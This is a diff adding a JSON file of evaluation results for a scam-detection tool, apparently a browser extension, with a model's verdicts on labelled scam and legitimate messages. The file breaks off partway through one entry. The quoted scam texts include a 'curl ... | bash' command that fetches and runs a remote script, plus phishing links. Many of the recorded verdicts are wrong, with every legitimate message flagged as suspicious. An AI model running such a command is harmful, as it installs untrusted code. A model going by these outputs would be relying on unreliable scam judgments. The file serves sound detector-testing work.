@@ -1,0 +1,361 @@
+{
+  "source": "https://github.com/VladimirRadev/scam-shield/actions/runs/45965556713 (artifact e2e-results: nano-calls-eval.json + eval-device.json)",
+  "browser": "Chrome 157",
+  "promptVersion": "v1",
+  "thresholds": {
+    "scam": 70,
+    "suspicious": 40
+  },
+  "answers": [
+    {
+      "id": "scam-recruiter-repo",
+      "label": "scam",
+      "recordedRisk": 70,
+      "latencyMs": 37239,
+      "out": "{\"risk\": 70, \"verdict\": \"scam\", \"category\": \"fake-recruiter\", \"reasons\": [{\"quote\": \"clone our repo from bitbucket.org/blockforge-hr/dex-dashboard\", \"why\": \"Requests cloning a repository and running commands to install malware, potentially for testing purposes; suspicious phishing tactic.\"}, {\"quote\": \"fix the wallet balance bug\", \"why\": \"Implies a need to fix a bug related to a wallet, which is a high-risk indicator.\"}, {\"quote\": \"schedule your interview with the CTO\", \"why\": \"Creating an urgency to schedule an interview makes the recipient suspicious.\"}, {\"quote\": \"Kindly finish it within 24 hours so we can schedule your interview\", \"why\": \"Creating an urgency to schedule an interview makes the recipient suspicious.\"}], \"advice\": \"Do not clone any repositories from unfamiliar sources. Refuse to install any software or attempt to debug a wallet unless you trust the source implicitly. Be extremely wary of urgent requests for action and deadlines.\"}"
+    },
+    {
+      "id": "scam-takehome-zip",
+      "label": "scam",
+      "recordedRisk": 83,
+      "latencyMs": 33947,
+      "out": "{\"risk\": 70, \"verdict\": \"suspicious\", \"category\": \"fake-recruiter\", \"reasons\": [{\"quote\": \"Attached is your test task (Assignment_Final.zip, password-protected, password: hire2026)\", \"why\": \"The message includes a test task with a password, which is a common tactic used by scammers to trick candidates into installing malware.\"}, {\"quote\": \"Extract the archive and run setup.exe to install the environment\", \"why\": \"Instructions to run a setup.exe immediately raise concerns, as this can be a gateway for malware.\"}, {\"quote\": \"Please keep this assignment confidential.\", \"why\": \"Requests for confidentiality are characteristic of scams attempting to extract sensitive information.\"}], \"advice\": \"Do not extract the attached archive or run any executables. Contact Quantia Systems directly using a known phone number or email address to verify the job posting.\"}"
+    },
+    {
+      "id": "scam-clickfix-captcha",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 23196,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"Verify you are human\", \"why\": \"The message attempts to trick the user into entering sensitive information or following malicious instructions, mimicking a security verification protocol.\"}], \"advice\": \"Do not enter any information. This appears to be a phishing scam attempting to steal your credentials. Do not follow the instructions provided.\"}"
+    },
+    {
+      "id": "scam-discord-npm",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 34622,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"malware-task\", \"reasons\": [{\"quote\": \"curl -sL https://get.pixelwar-beta.xyz/install.sh | bash\", \"why\": \"This is a command to execute a shell script from an untrusted source, which could install malware.\"}, {\"quote\": \"dont share the link pls, private beta\", \"why\": \"Request to avoid sharing a link is common scam tactic to divert suspicion.\"}, {\"quote\": \"send me a screenshot\", \"why\": \"Requesting screenshots is a common scam tactic.\"}, {\"quote\": \"we pay testers 300 USDT per session\", \"why\": \"Offers of money for tasks are highly suspicious and frequently used by scammers.\"}], \"advice\": \"Do not follow any links or instructions from unsolicited messages, especially those offering rewards. Never execute commands from unknown sources. Report this message to the appropriate authorities.\"}"
+    },
+    {
+      "id": "scam-recruiter-telegram",
+      "label": "scam",
+      "recordedRisk": 90,
+      "latencyMs": 37191,
+      "out": "{\"risk\": 90, \"verdict\": \"scam\", \"category\": \"fake-recruiter\", \"reasons\": [{\"quote\": \"Your resume has been selected for a part-time remote position.\", \"why\": \"Legitimate recruitment notifications usually come from the company/firm directly, not through individuals on Telegram.\"}, {\"quote\": \"Earn $300 per day by rating hotels and products, 30-60 minutes daily, no experience needed.\", \"why\": \"Realistic earning potential in a part-time remote position is typically not $300/day, especially with no experience.\"}, {\"quote\": \"Please contact our HR manager on Telegram @talenthub_linda to start today.\", \"why\": \"Requests to contact recruiters via Telegram, WhatsApp, or Signal are highly suspicious as they are often scam tactics.\"}, {\"quote\": \"Daily pay!\", \"why\": \"Promises of high daily earnings without significant effort are red flags for many scams.\"}], \"advice\": \"Be very cautious of unsolicited job offers. Do not initiate contact through Telegram or WhatsApp; instead, try to contact the company directly through a legitimate website or phone number. Never provide personal or financial information in response to a Telegram message.\"}"
+    },
+    {
+      "id": "scam-job-equipment",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 24820,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"advance-fee\", \"reasons\": [{\"quote\": \"We will mail you a check of $4,850.\", \"why\": \"Receiving a large sum of money via a mail-in check and being instructed to pay a portion back is a classic scam tactic.\"}], \"advice\": \"Never accept checks from unsolicited job offers. Do not deposit a check you haven't verified and do not send money back to anyone, especially to an unknown vendor. This is almost certainly a scam designed to obtain your money.\"}"
+    },
+    {
+      "id": "scam-money-mule",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 33037,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"fake-recruiter\", \"reasons\": [{\"quote\": \"Reply with your full name, date of birth and bank account details to begin.\", \"why\": \"This is a classic scam tactic to obtain sensitive financial information.\"}, {\"quote\": \"Your job is to receive payments from our clients into your personal bank account, keep 10% as your commission and forward the rest to our supplier in crypto.\", \"why\": \"The job description and the proposed compensation model are highly suspicious and inconsistent with legitimate businesses.\"}, {\"quote\": \"Nordvik Trading Ltd\", \"why\": \"The company name is vague and lacks verifiable information which is a red flag.\"}, {\"quote\": \"2 hours a week\", \"why\": \"The purported workload is unreasonable for a paid position.\"}], \"advice\": \"DO NOT provide any personal or financial information. This is likely a phishing scam to steal your identity and money.\"}"
+    },
+    {
+      "id": "scam-seed-support",
+      "label": "scam",
+      "recordedRisk": 98,
+      "latencyMs": 20445,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"wallet-drainer\", \"reasons\": [{\"quote\": \"metamask-restore.app/sync\", \"why\": \"Direct link requesting recovery phrase is a classic phishing attempt to steal your MetaMask wallet.\"}], \"advice\": \"Never enter your recovery phrase on any webpage, especially those claiming to be MetaMask. MetaMask will never ask for your seed phrase. Report this suspicious activity to MetaMask immediately.\"}"
+    },
+    {
+      "id": "scam-airdrop",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 21326,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"advance-fee\", \"reasons\": [{\"quote\": \"ZKSYNC Season 2 airdrop!\", \"why\": \"Promises airdrops with vague calculations and urgent claims of limited allocations to create pressure.\"}], \"advice\": \"Be extremely wary of airdrops, especially those promising large rewards. Never click links from unknown sources and be cautious of requests for wallet connections or signatures, as they could lead to a scam.\"}"
+    },
+    {
+      "id": "scam-wallet-validation",
+      "label": "scam",
+      "recordedRisk": 93,
+      "latencyMs": 19723,
+      "out": "{\"risk\": 90, \"verdict\": \"scam\", \"category\": \"wallet-drainer\", \"reasons\": [{\"quote\": \"paste your private key or seed phrase\", \"why\": \"This directly requests your private key or seed phrase, a critical piece of crypto information that should never be shared.\"}], \"advice\": \"Never enter your private key or seed phrase on any website.  This is a classic wallet drainer scam.\"}"
+    },
+    {
+      "id": "scam-ledger-letter",
+      "label": "scam",
+      "recordedRisk": 85,
+      "latencyMs": 33110,
+      "out": "{\"risk\": 85, \"verdict\": \"scam\", \"category\": \"wallet-drainer\", \"reasons\": [{\"quote\": \"Ledger Nano devices must complete a mandatory firmware validation\", \"why\": \"This creates a sense of urgency to validate the device, common in phishing scams to obtain recovery phrases.\"}, {\"quote\": \"enter your 24-word recovery phrase to confirm ownership\", \"why\": \"Requesting recovery phrases is a direct tactic to obtain control of funds stored on the Ledger device.\"}, {\"quote\": \"due to a recent security incident\", \"why\": \"The threat of a security incident is often used to rush users into action.\"}, {\"quote\": \"funds may be lost\", \"why\": \"The threat of losing funds is a strong motivator for action, further increasing the risk of falling for this scam.\"}], \"advice\": \"Never enter your recovery phrase or any other sensitive information into suspicious links. Ledger will never ask for your recovery phrase via email.\"}"
+    },
+    {
+      "id": "scam-lottery",
+      "label": "scam",
+      "recordedRisk": 98,
+      "latencyMs": 22446,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"advance-fee\", \"reasons\": [{\"quote\": \"pay the processing fee of $295\", \"why\": \"Demands payment for a non-existent prize is a classic advance-fee scam.\"}], \"advice\": \"This is a scam! Do not send any money or personal information. Legitimate lotteries do not require an upfront payment to claim prizes.\"}"
+    },
+    {
+      "id": "scam-inheritance",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 31668,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"advance-fee\", \"reasons\": [{\"quote\": \"unclaimed inheritance of $8.4 million\", \"why\": \"Promises an extremely large sum of money without any verifiable information or process.\"}, {\"quote\": \"I am Barrister James Okoro\", \"why\": \"Using a formal title without proper verification is a common tactic in advance-fee scams.\"}, {\"quote\": \"next of kin\", \"why\": \"Attempts to falsely establish a relationship to gain access to personal information.\"}, {\"quote\": \"reply urgently\", \"why\": \"Creates a sense of urgency to prevent critical thinking and prompt a response.\"}], \"advice\": \"Be extremely cautious of unsolicited offers of large sums of money. Do not share personal information or respond to urgent requests. Contact the authorities or the deceased's legal representatives directly to verify the inheritance claim.\"}"
+    },
+    {
+      "id": "scam-loan-fee",
+      "label": "scam",
+      "recordedRisk": 90,
+      "latencyMs": 26158,
+      "out": "{\"risk\": 90, \"verdict\": \"scam\", \"category\": \"advance-fee\", \"reasons\": [{\"quote\": \"pay the refundable insurance fee of EUR 149 via the link: bit.ly/qc-loan-fee\", \"why\": \"The message requests payment for an insurance fee with a link that seems suspicious, indicating a common advance-fee scam.\"}, {\"quote\": \"QuickCredit\", \"why\": \"The name \\\"QuickCredit\\\" is vague and potentially a misspelling of a legitimate company, aiming to mimic trustworthiness.\"}], \"advice\": \"Do not click the link or send any money. This is a scam to steal your financial information. Report it to the appropriate authorities.\"}"
+    },
+    {
+      "id": "scam-bank-details",
+      "label": "scam",
+      "recordedRisk": 90,
+      "latencyMs": 23667,
+      "out": "{\"risk\": 90, \"verdict\": \"scam\", \"category\": \"fake-invoice\", \"reasons\": [{\"quote\": \"Please note that our bank details have changed due to an audit of our old account.\", \"why\": \"Requests sudden changes to bank details under the guise of an audit are a common scam tactic.\"}], \"advice\": \"Do not pay the invoice. Do not use the old account. Contact Kestrel Components GmbH directly using a number found on their legitimate website to confirm the invoice and bank details. Do not forward any attached documents.\"}"
+    },
+    {
+      "id": "scam-overdue-invoice",
+      "label": "scam",
+      "recordedRisk": 85,
+      "latencyMs": 32058,
+      "out": "{\"risk\": 85, \"verdict\": \"scam\", \"category\": \"fake-invoice\", \"reasons\": [{\"quote\": \"FINAL NOTICE: Your invoice #88412 is 14 days overdue.\", \"why\": \"The message claims an overdue invoice and threatens legal action, common tactics of invoice fraud.\"}, {\"quote\": \"Open the attached document Invoice_88412.doc...\", \"why\": \"The message directs the recipient to an attached document, potentially containing malware or phishing links.\"}, {\"quote\": \"click Enable Content to view the amount and payment instructions.\", \"why\": \"This instruction prompts the recipient to click a link to access sensitive information or perform unauthorized actions.\"}, {\"quote\": \"\", \"why\": \"The sender is using a suspicious email address (Collections Department) which might be spoofed.\"}], \"advice\": \"Be very wary of any overdue invoice notifications. Do NOT open attachments or click any links. Contact your bank directly to verify any outstanding payments or invoices.\"}"
+    },
+    {
+      "id": "scam-dhl-sms",
+      "label": "scam",
+      "recordedRisk": 88,
+      "latencyMs": 19850,
+      "out": "{\"risk\": 80, \"verdict\": \"scam\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"DHL: Your parcel is on hold due to an incomplete address.\", \"why\": \"This message impersonates DHL to request payment for an address issue, a common phishing tactic.\"}], \"advice\": \"DHL rarely asks for payment via a link like this. Do not click the link and be wary of any unsolicited communication from DHL requesting payment.\"}"
+    },
+    {
+      "id": "scam-bank-sms",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 24801,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"Your Barclays card has been temporarily blocked due to unusual activity.\", \"why\": \"This is a phishing attempt to steal your banking information by disguising itself as Barclays.\"}, {\"quote\": \"http://barclays-secure-verify.com/restore\", \"why\": \"The link directs to a fake Barclays website designed to look legitimate, but traps users to steal credentials.\"}], \"advice\": \"Never click suspicious links or provide personal or financial information to unknown websites. Contact Barclays directly through their official website or phone number to resolve any card issues.\"}"
+    },
+    {
+      "id": "scam-netflix",
+      "label": "scam",
+      "recordedRisk": 77,
+      "latencyMs": 32206,
+      "out": "{\"risk\": 70, \"verdict\": \"scam\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"update your payment details\", \"why\": \"Netflix is prompting for billing information. This is a classic phishing attempt to steal your credentials.\"}, {\"quote\": \"Click the button below\", \"why\": \"The message strongly urges action via a link, a common tactic in phishing scams.\"}, {\"quote\": \"https://netfIix-billing-center.com/account\", \"why\": \"The link uses a misleading domain name, which is a hallmark of phishing websites.\"}, {\"quote\": \"Your Netflix membership will be suspended within 24 hours\", \"why\": \"Creating a sense of urgency to rush the recipient into taking action.\"}], \"advice\": \"Do not click the link. Do not update your payment details through this website. Contact Netflix directly via their official website or customer support number (found on their official website) to report this suspicious email.\"}"
+    },
+    {
+      "id": "scam-m365-password",
+      "label": "scam",
+      "recordedRisk": 80,
+      "latencyMs": 30186,
+      "out": "{\"risk\": 70, \"verdict\": \"suspicious\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"Microsoft 365: The password for your mailbox expires today.\", \"why\": \"The message claims an urgent password expiration, a common phishing tactic to create a sense of urgency.\"}, {\"quote\": \"To keep your current password, confirm your login details on the portal below.\", \"why\": \"Instructions to verify login details via an external portal are highly suspicious.\"}, {\"quote\": \"incoming emails deleted\", \"why\": \"Threats to delete emails are a characteristic of phishing attempts.\"}], \"advice\": \"Do not click on any links or enter your Microsoft account credentials. Microsoft will not email you passwords or threaten to delete your account unless you've enabled two-factor authentication. Contact Microsoft directly through their official channels (microsoft.com) if you have concerns.\"}"
+    },
+    {
+      "id": "scam-toll",
+      "label": "scam",
+      "recordedRisk": 90,
+      "latencyMs": 34160,
+      "out": "{\"risk\": 90, \"verdict\": \"scam\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"pay now at https://ezpass-tollpay.icu/pay\", \"why\": \"The URL redirects to a suspicious domain ('ezpass-tollpay.icu') likely designed to steal login credentials and financial information.\"}, {\"quote\": \"unpaid toll balance of $6.85\", \"why\": \"While legitimate toll payment reminders exist, the urgency and lack of clear communication methods are suspicious.\"}, {\"quote\": \"avoid a late fee of $50 and suspension of your vehicle registration\", \"why\": \"This is a scare tactic to pressure users into acting quickly without verifying the legitimacy of the payment request.\"}, {\"quote\": \"E-ZPass\", \"why\": \"Misrepresenting the sender as a legitimate company (E-ZPass) adds to the deceptive nature of the message.\"}], \"advice\": \"Do not click the link or send any payment. Contact E-ZPass directly through their official website or phone number to confirm the invoice.\"}"
+    },
+    {
+      "id": "scam-popup",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 38031,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"tech-support\", \"reasons\": [{\"quote\": \"Call Microsoft Support immediately at +1 (888) 555-0193 (toll-free)\", \"why\": \"The message instructs you to call a specific Microsoft support number, which is a common tactic of attackers.\"}, {\"quote\": \"Your computer has been infected with Trojan:Win32/Pornspy. Your files, passwords and banking data are at risk.\", \"why\": \"Threatening claims of malware infection create urgency and scare victims into taking action.\"}, {\"quote\": \"Do not close this window or restart your PC.\", \"why\": \"These instructions prevent you from wiping the malware and potentially deleting the attacker's backups.\"}, {\"quote\": \"A technician will help you remove the virus remotely.\", \"why\": \"Remote access support is a common phishing scam tactic to gain unauthorized access to your system.\"}], \"advice\": \"Do not open this message. Do not click on any links. Contact Microsoft through their official website by typing Microsoft.com into your browser.  Never give remote access to anyone.\"}"
+    },
+    {
+      "id": "scam-renewal",
+      "label": "scam",
+      "recordedRisk": 75,
+      "latencyMs": 23603,
+      "out": "{\"risk\": 70, \"verdict\": \"suspicious\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"Order confirmation #NX-449120\", \"why\": \"The message simulates a legitimate order confirmation but requests a refund through AnyDesk, a known tool for remote access malware installation.\"}], \"advice\": \"Be very cautious of messages claiming an unauthorized charge. Never use AnyDesk to request a refund. Contact Norton directly using the official website or their customer service number to verify the charge and request a refund.\"}"
+    },
+    {
+      "id": "scam-wrong-number",
+      "label": "scam",
+      "recordedRisk": 83,
+      "latencyMs": 34895,
+      "out": "{\"risk\": 80, \"verdict\": \"scam\", \"category\": \"investment-romance\", \"reasons\": [{\"quote\": \"crypto analyst and teaches me trading on a platform that gives about 8% weekly.\", \"why\": \"Promises of guaranteed high returns through crypto trading are highly suspicious and a common tactic in investment scams.\"}, {\"quote\": \"Maybe we can be friends?\", \"why\": \"The unsolicited friendship request and push for personal contact (WhatsApp) are typical of romance scams.\"}, {\"quote\": \"I'm Amy, I live in Singapore...\", \"why\": \"Providing unnecessary personal information adds a sense of legitimacy but is often used to build trust for scams.\"}, {\"quote\": \"add me on WhatsApp, it's easier.\", \"why\": \"Requests for direct messaging on platforms like WhatsApp or Telegram are often used by scammers to move conversations away from legitimate communication channels.\"}], \"advice\": \"Do not respond to the message. Do not add them on WhatsApp or Telegram. Be wary of unsolicited investment offers and promises of high returns.\"}"
+    },
+    {
+      "id": "scam-trading-mentor",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 36544,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"investment-romance\", \"reasons\": [{\"quote\": \"AI arbitrage bot delivers guaranteed returns of 3% daily with zero risk.\", \"why\": \"Guaranteed returns with zero risk are highly suspicious and a common tactic used in scams.\"}, {\"quote\": \"Start with just $500 and double your money in 30 days.\", \"why\": \"Promises of extremely high returns with little investment are a red flag for investment scams.\"}, {\"quote\": \"Deposit USDT (TRC20) to the address our assistant sends you, and keep this opportunity between us.\", \"why\": \"Requests for upfront cryptocurrency deposits, coupled with a restriction on sharing opportunity, are typical of pump-and-dump schemes.\"}, {\"quote\": \"VIP Quant Signals group!\", \"why\": \"Creating a sense of exclusivity and prestige to lure victims into investment schemes.\"}], \"advice\": \"Do not invest money in any opportunity that promises guaranteed high returns.  Be extremely wary of requests for cryptocurrency deposits from unknown sources and never share your wallet address with anyone unless you are absolutely certain of their legitimacy.\"}"
+    },
+    {
+      "id": "scam-recovery",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 31641,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"wallet-drainer\", \"reasons\": [{\"quote\": \"lost money to a crypto scam\", \"why\": \"The message explicitly asks for upfront payment in cryptocurrency as a condition for recovery, raising a strong red flag.\"}, {\"quote\": \"We have already helped 3,200 victims\", \"why\": \"Vague claims of success without verifiable information are common in wallet drainage schemes.\"}, {\"quote\": \"pay the 10% upfront assessment fee in BTC\", \"why\": \"Instructions to pay are a hallmark of scam attempts.\"}, {\"quote\": \"retrieve your stolen funds\", \"why\": \"Promises of recovering lost funds after upfront payment are a manipulative tactic.\"}], \"advice\": \"Be extremely cautious of requests for upfront payments in cryptocurrency or any other form of money. Never provide private keys or seed phrases. Verify the legitimacy of any crypto-related service before sending funds.\"}"
+    },
+    {
+      "id": "scam-marketplace-whatsapp",
+      "label": "scam",
+      "recordedRisk": 70,
+      "latencyMs": 24119,
+      "out": "{\"risk\": 70, \"verdict\": \"suspicious\", \"category\": \"off-platform-lure\", \"reasons\": [{\"quote\": \"WhatsApp +44 7700 900461 so I can send you the payment link from the delivery company.\", \"why\": \"Requesting to receive payment via WhatsApp without further verification is suspicious; payment links from unknown sources are often used in scams.\"}], \"advice\": \"Be wary of unsolicited messages regarding sales and payment requests. Never share personal or financial information via WhatsApp, especially payment links without independently verifying the legitimacy of the transaction and the sender.\"}"
+    },
+    {
+      "id": "scam-coinbase-lookalike",
+      "label": "scam",
+      "recordedRisk": 70,
+      "latencyMs": 38166,
+      "out": "{\"risk\": 70, \"verdict\": \"suspicious\", \"category\": \"wallet-drainer\", \"reasons\": [{\"quote\": \"Coinbase Security\", \"why\": \"The message claims to be from Coinbase Security, which is a potential phishing attempt to trick users into revealing account information or performing actions that drain their cryptocurrency.\"}, {\"quote\": \"A withdrawal of 0.4 BTC was requested from your account from a new device in Lagos\", \"why\": \"The request for a cryptocurrency withdrawal is suspicious, as it involves withdrawing a significant amount from a Coinbase account.\"}, {\"quote\": \"Cancel the request now at https://coinbase.com.secure-cancel.net/case/55120\", \"why\": \"The link directs to a URL that mimics the Coinbase site, designed to steal credentials, especially after requesting a financial transaction.\"}, {\"quote\": \"Requests that are not cancelled are processed automatically in 15 minutes.\", \"why\": \"The threat of automatic processing adds urgency, pushing users to act quickly without verification.\"}], \"advice\": \"Be very cautious! Never click links in suspicious messages, especially those claiming to be from legitimate services. Always independently verify requests by contacting Coinbase directly through their official website or phone number.\"}"
+    },
+    {
+      "id": "scam-ceo-giftcards",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 33907,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"advance-fee\", \"reasons\": [{\"quote\": \"buy 6 Apple gift cards of $200 each for a client appreciation event\", \"why\": \"Requests for gift card purchases are a common scam tactic to obtain funds without providing direct payment information.\"}, {\"quote\": \"scratch the back and send me the codes by email\", \"why\": \"This asks for sensitive information (gift card codes) which should never be shared.\"}, {\"quote\": \"I'll reimburse you today\", \"why\": \"Reimbursement after the purchase is a typical tactic to obfuscate the scam.\"}, {\"quote\": \"Don't tell anyone yet, it's a surprise\", \"why\": \"Creating a sense of urgency or secrecy is common in scams.\"}], \"advice\": \"Never give out gift card codes or personal information. Do not participate in advance-fee scams. Report this message to the appropriate authorities.\"}"
+    },
+    {
+      "id": "scam-irs-warrant",
+      "label": "scam",
+      "recordedRisk": 95,
+      "latencyMs": 38707,
+      "out": "{\"risk\": 95, \"verdict\": \"scam\", \"category\": \"advance-fee\", \"reasons\": [{\"quote\": \"To avoid arrest, you must pay the outstanding amount today with Google Play gift cards or a bitcoin ATM.\", \"why\": \"This message demands an immediate payment for unpaid taxes using unusual payment methods, a tactic characteristic of advance-fee scams.\"}, {\"quote\": \"An urgent message from the IRS tax enforcement division.\", \"why\": \"The IRS almost never initiates contact via phone for tax issues; legitimate IRS communications will always be sent via mail.\"}, {\"quote\": \"Call back immediately at 202-555-0164.\", \"why\": \"The phone number is suspicious and not a legitimate IRS contact number, often used in phishing scams.\"}, {\"quote\": \"An arrest warrant has been issued under your name for unpaid taxes of $4,780.\", \"why\": \"Threatening arrest as a coercive tactic is a hallmark of advance-fee and extortion schemes.\"}], \"advice\": \"Do not respond to this message. Never pay money to avoid legal action, especially not with unusual payment methods like gift cards or bitcoin ATMs. Report this message as phishing to the relevant authorities.\"}"
+    },
+    {
+      "id": "legit-recruiter",
+      "label": "legit",
+      "recordedRisk": 40,
+      "latencyMs": 27680,
+      "out": "{\"risk\": 40, \"verdict\": \"suspicious\", \"category\": \"fake-recruiter\", \"reasons\": [{\"quote\": \"Senior Backend Engineer (hybrid, €85-100k)\", \"why\": \"Offers a job opportunity with specific salary details, a common tactic of fake recruiters.\"}, {\"quote\": \"Northwind Labs\", \"why\": \"Mentions a company name, which could be a phishing attempt to impersonate a legitimate organization.\"}], \"advice\": \"Be cautious of job offers from unfamiliar sources. Always verify the legitimacy of the company through independent channels like their official website and LinkedIn. Never share personal financial information or click on suspicious links unless you are certain of the sender's authenticity.\"}"
+    },
+    {
+      "id": "legit-invoice",
+      "label": "legit",
+      "recordedRisk": 65,
+      "latencyMs": 25005,
+      "out": "{\"risk\": 65, \"verdict\": \"suspicious\", \"category\": \"fake-invoice\", \"reasons\": [{\"quote\": \"INV-2026-0142 for the October hosting and support services (EUR 1,240.00, VAT included)\", \"why\": \"The message contains details of an invoice, but is sent via email, which could indicate a phishing attempt.\"}], \"advice\": \"Be cautious of unsolicited invoices. Always verify invoices directly with the company through their official website or phone number. Never click on links in suspicious emails.\"}"
+    },
+    {
+      "id": "legit-github",
+      "label": "legit",
+      "recordedRisk": 30,
+      "latencyMs": 24150,
+      "out": "{\"risk\": 30, \"verdict\": \"suspicious\", \"category\": \"other\", \"reasons\": [{\"quote\": \"request your review\", \"why\": \"Review requests are legitimate, but accessing GitHub pull requests via a shared link is a red flag.\"}, {\"quote\": \"@kchen requested your review\", \"why\": \"Email address format does not seem professional.\"}], \"advice\": \"Be cautious of unsolicited review requests and be wary of accessing external links unless you trust the sender completely. Verify the sender's identity through other means if possible.\"}"
+    },
+    {
+      "id": "legit-bank-signin",
+      "label": "legit",
+      "recordedRisk": 40,
+      "latencyMs": 28498,
+      "out": "{\"risk\": 40, \"verdict\": \"suspicious\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"We noticed a new sign-in to your online banking...\", \"why\": \"The message claims to be from a reputable bank, prompting action based on recent login activity, which is a common phishing tactic.\"}, {\"quote\": \"If you don't recognise it...\", \"why\": \"Requests to verify activity and contact the bank demonstrate an attempt to create a sense of urgency and concern.\"}], \"advice\": \"Be wary of unsolicited messages claiming to be from your bank. Always verify communications directly through the bank's official website or by contacting them using a number found on your banking app or card, not one provided in the message.\"}"
+    },
+    {
+      "id": "legit-dhl-update",
+      "label": "legit",
+      "recordedRisk": 70,
+      "latencyMs": 33789,
+      "out": "{\"risk\": 70, \"verdict\": \"suspicious\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"Your DHL shipment...\", \"why\": \"DHL tracking links can be used in phishing attacks to steal personal information; be cautious of unsolicited notifications.\"}, {\"quote\": \"follow it or choose a different delivery day...\", \"why\": \"The message appears to be a fabricated tracking notification, implying an urgent need for action.\"}, {\"quote\": \"No action is needed...\", \"why\": \"While seemingly benign, the phrasing is suspicious and may be used to lull the sender into complacency while they harvest data.\"}, {\"quote\": \"https://www.dhl.com/tracking\", \"why\": \"The link directs to DHL's website, which could be a phishing site designed to look like the legitimate DHL tracking page.\"}], \"advice\": \"Do not click the link. DHL notifications are typically sent directly to your email. Contact DHL directly through their official website or phone number if you need to confirm your shipment's status.\"}"
+    },
+    {
+      "id": "legit-colleague-repo",
+      "label": "legit",
+      "recordedRisk": 55,
+      "latencyMs": 19762,
+      "out": "{\"risk\": 55, \"verdict\": \"suspicious\", \"category\": \"tech-support\", \"reasons\": [{\"quote\": \"pull the branch and run npm test\", \"why\": \"Instructions to download and execute code can be a tactic used by attackers to install malware.\"}], \"advice\": \"Be cautious of requests to access your computer or code. Never execute code from untrusted sources and be wary of technical support scams.\"}"
+    },
+    {
+      "id": "legit-exchange-warning",
+      "label": "legit",
+      "recordedRisk": 20,
+      "latencyMs": 33151,
+      "out": "{\"risk\": 20, \"verdict\": \"suspicious\", \"category\": \"wallet-drainer\", \"reasons\": [{\"quote\": \"recovery phrase\", \"why\": \"The message explicitly warns against sharing recovery phrases, which is a strong red flag for wallet drainer scams.\"}, {\"quote\": \"never ask for your recovery phrase or private key\", \"why\": \"This is a direct warning against compromising your crypto wallet security.\"}, {\"quote\": \"never share your seed phrase with anyone\", \"why\": \"Seed phrases are essential for controlling your crypto, and exposing them grants access to funds.\"}, {\"quote\": \"never to a \\\"safe\\\" wallet\", \"why\": \"Claims to move funds to a \\\"safe\\\" wallet is a tactic to lure users into giving away their assets.\"}], \"advice\": \"Be extremely cautious of any message asking for your seed phrase or private key. Never share this information with anyone, even if it appears to be from a legitimate source. Always verify the sender's identity through official channels.\"}"
+    },
+    {
+      "id": "legit-interview-invite",
+      "label": "legit",
+      "recordedRisk": 40,
+      "latencyMs": 27802,
+      "out": "{\"risk\": 40, \"verdict\": \"suspicious\", \"category\": \"fake-recruiter\", \"reasons\": [{\"quote\": \"Product Designer role\", \"why\": \"The message explicitly mentions a job application, which is a common tactic used by scammers to gain trust.\"}, {\"quote\": \"https://calendly.com/fernwood-studio/design-interview\", \"why\": \"The provided link is used to schedule a video interview, which is a standard step in the hiring process but can also be a way to gather personal information or install malware.\"}], \"advice\": \"Be wary of unsolicited job offers and video interviews. Never click on links from unknown sources, especially those requesting personal information or scheduling appointments.\"}"
+    },
+    {
+      "id": "legit-takehome",
+      "label": "legit",
+      "recordedRisk": 65,
+      "latencyMs": 27962,
+      "out": "{\"risk\": 65, \"verdict\": \"suspicious\", \"category\": \"malware-task\", \"reasons\": [{\"quote\": \"take-home exercise: build a REST endpoint\", \"why\": \"This describes a task to create code, which can be a precursor to installing malware or collecting sensitive information.\"}, {\"quote\": \"send us the link within a week\", \"why\": \"Requiring you to send a link to your GitHub repository is suspicious, as legitimate employers often don't request this early in the process.\"}], \"advice\": \"Be wary of tasks that ask you to create code and send it to you. Never download or install anything from the employer unless you trust their website and the source of the code.\"}"
+    },
+    {
+      "id": "legit-otp",
+      "label": "legit",
+      "recordedRisk": 90,
+      "latencyMs": 32669,
